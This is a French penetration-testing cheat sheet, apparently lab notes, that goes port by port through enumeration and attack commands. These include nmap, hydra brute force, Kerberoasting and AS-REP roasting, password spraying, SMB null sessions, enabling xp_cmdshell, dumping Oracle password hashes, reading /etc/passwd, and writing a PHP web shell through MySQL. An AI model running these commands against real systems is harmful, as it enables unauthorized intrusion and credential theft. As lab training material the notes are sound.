# NMAP - recherche de ports ouverts

```bash
nmap -p- <machine_ip>
nmap -sC -sV -A <machine_ip>
cat nmap.txt | grep open | cut -d "/" -f1 | sed -z "s/\n/,/g"
```

```bash
-p- : tous les ports
-sU : scan UDP (défaut TCP)
-sC : script par défaut
-sV : énumère les versions
--script vuln : lance scripts pour vérifier si vulnérabilité
```

# FTP (21)

```bash
ftp <machine_ip>
ftp anonymous@<machine_ip>
wget -m --no-passive ftp://anonymous:anonymous@10.129.167.42
```

```bash
get : télécharger
mget * : télécharger tous les fichiers
put : upload
passive : passe en mode passive
binary / ascii : mode de téléchargement
prompt off : désactiver prompt
```

Notes :
- anonymous
- admin:admin

# SSH (22)

## Créer clefs ssh

```bash
ssh-keygen
# copier contenu id_rsa.pub dans authorized_keys du serveur distant
chmod 600 id_rsa
ssh -i id_rsa user@<machine_ip>
```

```bash
ssh -v cry0l1t3@10.129.14.132 -o PreferredAuthentications=password
```

# SMTP (25)

```bash
nmap -p 25 --script smtp-open-relay 10.129.133.224 -v
smtp-user-enum -M EXPN -U users.txt -t <machine_ip> -vv
hydra -l user@domaine.local -P /usr/share/wordlists/rockyou.txt smtp://10.129.103.36 -f
```

```bash
-M : EXPN / RCPT / VRFY
```

# DNS (53)

```bash
dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r
dig any @w<machine_ip> inlanefreight.com
```

## DNS Zone transfer

```bash
dig axfr @<DNS_IP>
dig axfr @<DNS_IP> <DOMAIN>
```

# Kerberos (88)

## ASREProast

```bash
impacket-GetNPUsers -dc-ip <machine_ip> domain.local/ -usersfile ~/user.txt -format hashcat -outputfile hash.txt
impacket-GetNPUsers domain/user:password -request -format hashcat -outputfile hash.txt
```

## Kerberoast

```bash
impacket-GetUserSPNs domain.local/svc_tgs:pasword123 -dc-ip <machine_ip>  -request
```

Si problème d'horloge (trop grande différence entre notre machine et la cible)

```bash
sudo ntpdate 10.10.11.41
```
## Kerbrute

```bash
kerbrute userenum -d test.local usernames.txt --dc test.com
kerbrute bruteuser -d test.local passwords.txt john
kerbrute passwordspray -d test.local domain_users.txt password123
```

# POP (110/995) IMAP (143,993)

## Commandes IMAP

| **Commande**                    | **Description**                                                                                                         |
| ------------------------------- | ----------------------------------------------------------------------------------------------------------------------- |
| `1 LOGIN username password`     | Connexion de l'utilisateur.                                                                                             |
| `1 LIST "" *`                   | Répertorie tous les répertoires.                                                                                        |
| `1 CREATE "INBOX"`              | Crée une boîte aux lettres avec un nom spécifié.                                                                        |
| `1 DELETE "INBOX"`              | Supprime une boîte aux lettres.                                                                                         |
| `1 RENAME "ToRead" "Important"` | Renomme une boîte aux lettres.                                                                                          |
| `1 LSUB "" *`                   | Renvoie un sous-ensemble de noms de l'ensemble de noms que l'utilisateur a déclaré comme étant `active`ou `subscribed`. |
| `1 SELECT INBOX`                | Sélectionne une boîte aux lettres afin que les messages qu'elle contient soient accessibles.                            |
| `1 UNSELECT INBOX`              | Quitte la boîte aux lettres sélectionnée.                                                                               |
| `1 FETCH <ID> all`              | Récupère les données associées à un message dans la boîte aux lettres.                                                  |
| `1 CLOSE`                       | Supprime tous les messages avec l' `Deleted`indicateur défini.                                                          |
| `1 LOGOUT`                      | Ferme la connexion avec le serveur IMAP.                                                                                |
| `1 FETCH 1 (BODY[])`            | Montre le message                                                                                                       |
## Commandes POP3

|**Commande**|**Description**|
|---|---|
|`USER username`|Identifie l'utilisateur.|
|`PASS password`|Authentification de l'utilisateur à l'aide de son mot de passe.|
|`STAT`|Demande le nombre d'e-mails enregistrés auprès du serveur.|
|`LIST`|Demande au serveur le nombre et la taille de tous les e-mails.|
|`RETR id`|Demande au serveur de livrer l'e-mail demandé par ID.|
|`DELE id`|Demande au serveur de supprimer l'e-mail demandé par ID.|
|`CAPA`|Demande au serveur d'afficher les capacités du serveur.|
|`RSET`|Demande au serveur de réinitialiser les informations transmises.|
|`QUIT`|Ferme la connexion avec le serveur POP3.
```bash
openssl s_client -connect 10.129.14.128:imaps
openssl s_client -connect 10.129.14.128:pop3s
telnet <machine_ip> <port>
```
# RPC (135/593)

```bash
impacket-rpcdump <machine_ip> -p 135
impacket-IOXIDResolver -t <machine_ip>
rpcclient -U domain/user -I <machine_ip> dc01.test.com
rpcclient htb.local -U "" -N
```

```bash
impacket-dcomexec -object MMC20 test.local/john:password123@10.10.10.1
# -object : MMC20 / ShellWindows / ShellBrowserWindow
```

```bash
rpcclient -U "" <machine_ip>
srvinfo
enumdomains
querydomain
netshareenumall
enumdomusers
queryuser <RID>	
```

```bash
for i in $(seq 500 1100);do rpcclient -N -U "" <machine_ip> -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```
# SMB (139/445)

```bash
enum4linux <machine_ip> -a
nxc smb 10.10.11.41 -u judith.mader -p judith09 --rid-brute
smbget -R smb://10.10.210.199/anonymous
```
## SMBCLIENT

```bash
smbclient //<machine_ip>/<partage>
smbclient -L //192.168.202.10 -U ''%''    # mdp et utilisateurs vides
```

## SMBMAP

```bash
smbmap -H 10.10.216.180 -u bob -p '!P@$$W0rD!123' -r IPC$ -A . 
smbmap -H 10.10.216.180 --download "share\note.txt"
smbmap -H 10.10.216.180 --upload test.txt "notes\test.txt"
```

# SNMP (161,162/UDP)

```bash
snmpwalk -v 2c -c public  .1 #all
snmpwalk -v X -c public <machine_IP> 1.3.6.1.4.1.77.1.2.25
snmpwalk -v X -c public <machine_IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
onesixtyone -c dict.txt <machine_IP>
```

```
| 1.3.6.1.2.1.25.1.6.0   | System Processes |
| 1.3.6.1.2.1.25.4.2.1.2 | Running Programs |
| 1.3.6.1.2.1.25.4.2.1.4 | Processes Path   |
| 1.3.6.1.2.1.25.2.3.1.4 | Storage Units    |
| 1.3.6.1.2.1.25.6.3.1.2 | Software Name    |
| 1.3.6.1.4.1.77.1.2.25  | User Accounts    |
| 1.3.6.1.2.1.6.13.1.3   | TCP Local Ports  |
```

# MSSQL

```bash
impacket-mssqlclient user:pass@<machine_ip> -windows-auth

enum_db
use <db>
go
SELECT table_name FROM flagDB.INFORMATION_SCHEMA.tables
go
SELECT * FROM tb_flag
```

```bash
EXECUTE sp_configure 'show advanced options', 1
RECONFIGURE
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE
```
# Oracle DB (1521/1748)

```bash
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
./odat all -s 10.129.205.19
sqlplus scott/tiger@10.129.204.235/XE

select name, password from sys.user$;
```

```bash
Si : sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory
--> sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

# LDAP (389/3268)

```bash
ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"

ldapsearch -H ldap://10.10.10.175/ -x -s base -b '' "(objectClass=*)" "*" +
```

# NFS (2049)

```bash
showmount -e <machine_ip>

mkdir target-NFS
sudo mount -t nfs <machine_ip>:/ ./target-NFS/ -o nolock
```

# MySQL (3306)

```bash
mysql -h 192.168.100.1 -u admin -p
```

```
show databases;
use <database>;
show tables;
select * from <table>;

SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
select LOAD_FILE("/etc/passwd");
```

Notes :
- oublier le ';' ?  \c ou ctrl+d

